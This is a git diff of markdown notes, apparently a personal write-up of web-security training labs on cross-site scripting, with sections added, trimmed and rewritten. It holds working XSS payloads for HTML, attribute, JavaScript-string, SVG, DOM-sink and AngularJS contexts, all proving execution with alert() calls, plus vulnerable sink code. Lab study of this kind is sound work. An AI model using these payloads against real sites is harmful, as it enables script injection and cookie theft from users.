@@ -177,7 +177,6 @@ function reqListener() {
 
 ## XSS
 #### Reflected XSS into HTML context with nothing encoded
-
 Search bar `<img src=x onerror=alert(1)>`
 
 #### Reflected XSS into HTML context with most tags and attributes blocked
@@ -229,6 +228,61 @@ Then after modifying a payload from [here](https://brutelogic.com.br/blog/xss-wi
 
 Intended solution (which didn't work for me for some reason): `<svg><a><animate+attributeName=href+values=javascript:alert(1)+/><text+x=20+y=20>Click me</text></a>`
 
+#### Reflected XSS with some SVG markup allowed
+
+First I checked all the tags allowed using [this](xss/rxss-svg-allowed.py) script.
+
+```
+discard
+image
+svg
+title
+```
+
+Then I check all the events allowed using the same script.
+
+```
+onbegin
+```
+
+The only payload using the above event handler was: `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`
+
+I then try to draw a basic circle using `<svg>` which works:
+
+```html
+<svg width="100" height="100">
+  <circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" />
+</svg>
+```
+
+But tags like `<script>` are diassallowed. So I pulled all tags that are usually used in `<svg>` and ran the same script to see which ones were allowed.
+
+```
+circle
+discard
+ellipse
+image
+line
+rect
+svg
+text
+title
+```
+
+#### Reflected XSS into attribute with angle brackets HTML-encoded
+
+```html
+" autofocus onfocus="alert(1)
+```
+
+#### Stored XSS into anchor href attribute with double quotes HTML-encoded
+In website textbox put: `javascript:alert(1)`
+
+#### Reflected XSS into a JavaScript string with angle brackets HTML encoded
+```javascript
+'; alert(1);//
+```
+
 #### Stored XSS into HTML context with nothing encoded
 Comment `<img src=x onerror=alert(1)>`
 
@@ -253,49 +307,7 @@ Using this payload `x"><script>alert(1)</script><img src="x` the document.write 
 
 Intended solution `"><svg onload=alert(1)>`
 
-#### DOM XSS in document.write sink using source location.search inside a select element
-Relevant code
-
-```javascript
-var stores = ["London","Paris","Milan"];
-var store = (new URLSearchParams(window.location.search)).get('storeId');
-document.write('<select name="storeId">');
-if(store) {
-    document.write('<option selected>'+store+'</option>');
-}
-for(var i=0;i<stores.length;i++) {
-    if(stores[i] === store) {
-        continue;
-    }
-    document.write('<option>'+stores[i]+'</option>');
-}
-document.write('</select>');
-```
-
-- We see that `storeId` is acting as a sink.
-- As soon as we add it to the query, we get it as an option in select.
-- We will have to close option and select tags and then inject our alert payload.
-
-```html
-<select name="storeId">
-	<option>London</option>
-	<option>Paris</option>
-	<option>Milan</option>
-</select>
-```
-
-Working payload `</option></select><svg onload=alert(1)>`
-Intended solution `"></select><img src=1 onerror=alert(1)>`
-
-
-- The innerHTML sink doesn't accept script elements on any modern browser, nor will svg onload events fire.
-- This means you will need to use alternative elements like img or iframe.
-
-```element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'```
-
 #### DOM XSS in innerHTML sink using source location.search
-
-Relevant code
 
 ```javascript
 function doSearchQuery(query) {
@@ -305,50 +317,21 @@ var query = (new URLSearchParams(window.location.search)).get('search');
 if(query) {
     doSearchQuery(query);
 }
-```
+``` 
 
-- Doesn't work `</span><script>alert(1)</script><span>` (due to innerHTML restrictions above)
-- Does work `<img src=1 onerror=alert(1)>`
+My solution: `/?search=<svg%20onload=alert(1)>`
 
 #### DOM XSS in jQuery anchor href attribute sink using location.search source
 
-Relevant code
+Searched for `$('` and found:
 
 ```javascript
 $(function() {
-	$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
 });
 ```
 
-- Putting `/feedback?returnPath=javascript:alert(1)` pops alert on clicking the link, but we need a 0-click payload.
-- Doesn't work `/feedback?returnPath="><img src=x onerror=alert(1)><a href="`
-- Works `/feedback?returnPath=javascript:onload=alert(document.cookie)`
-
-#### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
-Using Wappalyzer, I found out that the AngularJS version is 1.7.7 and from this [blog](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs) by Gareth Heyes I found out the corresponding payload in Angular >= 1.6.0 which doesn't have a sandbox. `{{constructor.constructor('alert(1)')()}}`
-
-Intended solution `{{$on.constructor('alert(1)')()}}`
-
-#### Reflected DOM XSS
-In file searchResult.js breakpoint at line 5.
-
-```javascript
-eval('var searchResultsObj = ' + this.responseText);
-```
-
-In console check value of `this.responseText`
-
-```javascript
-"{\"searchTerm\":\"asdf\",\"results\":[]}"
-```
-
-Therefore searchTerm under searchResultObj is user supplied. It is being sunk at line 19.
-
-```javascript
-h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
-```
-
-XSS in [innerText](https://stackoverflow.com/questions/52707031/does-innertext-prevent-xss).
+My solution: `/feedback?returnPath=javascript:alert(1)`
 
 ## SQLi
 #### SQL injection UNION attack, determining the number of columns returned by the query
